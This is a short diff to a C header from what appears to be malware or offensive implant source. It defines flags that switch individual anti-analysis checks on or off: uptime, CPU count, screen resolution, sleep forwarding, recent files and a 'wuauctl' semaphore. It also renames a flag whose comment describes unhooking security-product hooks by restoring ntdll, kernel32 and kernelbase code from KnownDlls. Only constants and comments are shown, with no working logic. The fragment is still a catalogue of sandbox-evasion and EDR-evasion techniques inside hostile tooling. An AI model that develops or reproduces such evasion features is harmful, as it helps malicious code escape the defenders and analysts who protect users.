@@ -38,7 +38,7 @@
 #define EVASION_FLAG_NO_EXEC_CTRL    (1u << 9)   /* skip "wuauctl" semaphore check   */
 #define EVASION_FLAG_NO_UPTIME       (1u << 10)  /* skip < 2 min uptime check        */
 #define EVASION_FLAG_NO_CPU_COUNT    (1u << 11)  /* skip < 2 CPU check               */
-#define EVASION_FLAG_UNHOOK            (1u << 12)  /* unhook */
+#define OPSEC_FLAG_UNHOOK              (1u << 12)  /* restore ntdll/kernel32/kernelbase .text from \\KnownDlls\\ */
 #define EVASION_FLAG_NO_SLEEP_FWD    (1u << 13)  /* skip sleep-forwarding check      */
 #define EVASION_FLAG_NO_SCREEN_RES   (1u << 14)  /* skip screen resolution check     */
 #define EVASION_FLAG_NO_RECENT_FILES (1u << 15)  /* skip recent-files count check    */
